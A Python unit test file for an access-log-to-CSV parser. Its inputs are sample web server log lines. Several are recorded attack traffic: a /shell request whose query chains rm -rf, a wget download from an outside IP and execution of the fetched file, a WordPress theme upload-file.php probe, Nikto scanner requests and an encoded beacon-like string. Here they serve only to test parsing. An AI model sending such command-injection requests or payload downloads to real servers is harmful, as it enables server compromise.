from datetime import datetime
from unittest import TestCase
from access_to_csv import parse_line


class TestParsing(TestCase):
    def test_parse(self):
        test_set = [
            (
                '109.169.248.247 - - [12/Dec/2015:18:25:11 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"',
                [
                    '109.169.248.247',
                    None,
                    None,
                    datetime.fromisoformat('2015-12-12T18:25:11'),
                    'GET',
                    '/administrator/',
                    'HTTP/1.1',
                    200,
                    4263,
                    None,
                    'Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0',
                ]
            ),
            (
                '10.0.4.2 - - [23/Apr/2017:07:32:29 +0400] "GET / HTTP/1.1" 403 4897 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.1 Safari/603.1.30"',
                [
                    '10.0.4.2',
                    None,
                    None,
                    datetime.fromisoformat('2017-04-23T07:32:29'),
                    'GET',
                    '/',
                    'HTTP/1.1',
                    403,
                    4897,
                    None,
                    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.1 Safari/603.1.30',
                ]
            ),
            (
                '118.89.226.174 - - [03/Oct/2020:00:00:28 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+212.83.141.42/beastmode/uz;chmod+777+/tmp/uz;sh+/tmp/uz+BeastMode.Rep.Jaws HTTP/1.1" 200 474 "-" "Hello, world"',
                [
                    '118.89.226.174',
                    None,
                    None,
                    datetime.fromisoformat('2020-10-03T00:00:28'),
                    'GET',
                    '/shell?cd+/tmp;rm+-rf+*;wget+212.83.141.42/beastmode/uz;chmod+777+/tmp/uz;sh+/tmp/uz+BeastMode.Rep.Jaws',
                    'HTTP/1.1',
                    200,
                    474,
                    None,
                    'Hello, world',
                ]
            ),
            (
                '78.85.208.240 - - [03/Oct/2020:00:07:00 +0000] "GET /wp-content/themes/mantra/admin/upload-file.php HTTP/1.1" 200 474 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"',
                [
                    '78.85.208.240',
                    None,
                    None,
                    datetime.fromisoformat('2020-10-03:00:07:00'),
                    'GET',
                    '/wp-content/themes/mantra/admin/upload-file.php',
                    'HTTP/1.1',
                    200,
                    474,
                    None,
                    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36',
                ]
            ),
            (
                '91.218.225.68 - - [20/Jun/2018:09:16:54 +0200] "GET /MbwwyWkz.xml  HTTP/1.1" 404 218 "-" "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:map_codes)" "-"',
                [
                    '91.218.225.68',
                    None,
                    None,
                    datetime.fromisoformat('2018-06-20:09:16:54'),
                    'GET',
                    '/MbwwyWkz.xml',
                    'HTTP/1.1',
                    404,
                    218,
                    None,
                    'Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:map_codes)',
                ]
            ),
            (
                '''66.240.205.34 - - [03/Oct/2020:02:49:49 +0000] "145.ll|'|'|SGFjS2VkX0Q0OTkwNjI3|'|'|WIN-JNAPIER0859|'|'|JNapier|'|'|19-02-01|'|'||'|'|Win 7 Professional SP1 x64|'|'|No|'|'|0.7d|'|'|..|'|'|AA==|'|'|112.inf|'|'|SGFjS2VkDQoxOTIuMTY4LjkyLjIyMjo1NTUyDQpEZXNrdG9wDQpjbGllbnRhLmV4ZQ0KRmFsc2UNCkZhbHNlDQpUcnVlDQpGYWxzZQ==12.act|'|'|AA==" 400 166 "-" "-"''',
                [
                    '66.240.205.34',
                    None,
                    None,
                    datetime.fromisoformat('2020-10-03:02:49:49'),
                    'malformed',
                    'malformed',
                    'malformed',
                    400,
                    166,
                    None,
                    None,
                ]
            ),
            (
                '91.218.225.68 - "" [20/Jun/2018:09:18:40 +0200] "GET /private/ HTTP/1.1" 401 409 "-" "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001805)" "-"',
                [
                    '91.218.225.68',
                    None,
                    None,
                    datetime.fromisoformat('2018-06-20:09:18:40'),
                    'GET',
                    '/private/',
                    'HTTP/1.1',
                    401,
                    409,
                    None,
                    'Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001805)',
                ]
            ),
# This test currently fails but wasn't worth fixing for now
#             (
#                 '185.132.1.52 - - [09/Oct/2020:20:33:37 +0000] "GET HTTP/1.1" 400 166 "-" "-"',
#                 [
#                     '185.132.1.52',
#                     None,
#                     None,
#                     datetime.fromisoformat('2020-10-09:20:33:37'),
#                     'GET',
#                     None,
#                     'HTTP/1.1',
#                     400,
#                     166,
#                     None,
#                     None,
#                 ]
#             ),
            (
                '104.130.201.111 - - [03/Oct/2020:15:12:26 +0000] "GET HTTP/1.1 HTTP/1.1" 400 166 "-" "-"',
                [
                    '104.130.201.111',
                    None,
                    None,
                    datetime.fromisoformat('2020-10-03:15:12:26'),
                    'GET',
                    'HTTP/1.1',
                    'HTTP/1.1',
                    400,
                    166,
                    None,
                    None
                ]
            )
        ]

        for line, expected in test_set:
            with self.subTest():
                actual = parse_line(line)
                self.assertEqual(expected, actual)
